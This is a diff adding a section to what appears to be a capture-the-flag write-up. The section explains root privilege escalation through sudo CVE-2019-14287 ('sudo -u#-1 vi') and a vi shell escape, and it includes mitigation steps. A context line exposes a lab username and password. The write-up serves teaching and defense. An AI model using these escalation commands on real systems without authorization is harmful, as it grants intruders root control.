@@ -475,6 +475,70 @@ skyfuck:8730281lkjlkjdqlksalks
 
 <details>
   <summary>
+
+  
+  ### Privilege Escalation via Sudo Vi (CVE-2019-14287)
+  
+  </summary>
+### **1. Checking Sudo Permissions**
+Ran `sudo -l` and found:
+```bash
+User gwendoline may run: (ALL, !root) NOPASSWD: /usr/bin/vi /home/gwendoline/user.txt
+```
+→ **Vi can be executed as any user except root** (`!root`) without a password.
+
+---
+
+### **2. Exploiting Vi to Gain Root Shell**
+#### **Method 1: User ID Manipulation (CVE-2019-14287)**
+```bash
+sudo -u#-1 /usr/bin/vi /home/gwendoline/user.txt
+```
+- **Why it works**:  
+  `-u#-1` triggers an integer underflow, resolving to **UID 0 (root)** despite `!root` restriction.
+
+#### **Method 2: Vi Shell Escape**
+Inside Vi:
+```vim
+:!/bin/bash
+```
+→ Spawns a **root shell** (GTFOBins technique).
+
+---
+
+### **3. Why This Works**
+| Vulnerability | Impact | Tool Reference |
+|--------------|--------|----------------|
+| **CVE-2019-14287** | Bypasses `!root` restriction via `-u#-1` trick | [Sudo Security Advisory](https://www.sudo.ws/alerts/unescape_overflow.html) |
+| **Vi Shell Escape** | Arbitrary command execution as root | [GTFOBins: vi](https://gtfobins.github.io/gtfobins/vi/) |
+| **NOPASSWD Misconfiguration** | No password required for escalation | |
+
+---
+
+### **4. Mitigation**
+1. **Update Sudo**: Patch to version **1.8.28+** to fix CVE-2019-14287.
+2. **Restrict Sudoers**:
+   ```bash
+   # Replace:
+   (ALL, !root) NOPASSWD: /usr/bin/vi
+   # With:
+   (gwendoline) NOPASSWD: /usr/bin/vi /home/gwendoline/user.txt
+   ```
+3. **Audit**: Regularly run `sudo -l` for all users.
+
+---
+
+### **5. Impact: Critical (Root Access)**
+- **Proof of Concept**:
+  ```bash
+  whoami  # Output: root
+  cat /root/root.txt
+  ```
+
+</details>
+
+<details>
+  <summary>
     
 ### Privilege Escalation via `sudo wget` Exploitation
     
